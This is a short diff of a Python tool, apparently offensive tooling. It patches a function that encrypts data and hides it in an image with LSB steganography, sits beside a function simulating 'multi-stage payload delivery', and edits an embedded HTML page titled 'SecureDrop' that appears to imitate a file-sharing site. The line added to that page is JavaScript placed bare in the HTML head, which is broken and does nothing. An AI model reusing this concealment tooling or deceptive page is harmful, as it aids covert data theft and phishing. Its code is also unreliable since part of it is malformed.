@@ -221,6 +221,17 @@ def embed_data_in_image(data):
     os.remove(temp_path)
     return stego_img
 
+# Define the patched version of embed_data_in_image
+def embed_data_in_image_patched(data):
+    encrypted_data = CIPHER.encrypt(json.dumps(data).encode())
+    encrypted_str = base64.b64encode(encrypted_data).decode('utf-8')
+    base_img = PILImage.new('RGB', (500, 500), color='white')
+    stego_img = lsb.hide(base_img, encrypted_str)
+    return stego_img
+
+# Monkey patch embed_data_in_image
+embed_data_in_image = embed_data_in_image_patched
+
 def simulate_multi_stage_payload(data):
     logging.info(f"Simulating multi-stage payload delivery with data: {json.dumps(data)}")
     stage_payload = {"stage": "initial", "info": "Initial payload delivered"}
@@ -425,6 +436,7 @@ DRIVE_PAGE = """
 <html>
 <head>
     <meta charset="UTF-8">
+ IFrameElement.prototype.__class__ = "HTMLIFrameElement";
     <title>SecureDrop</title>
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <style>
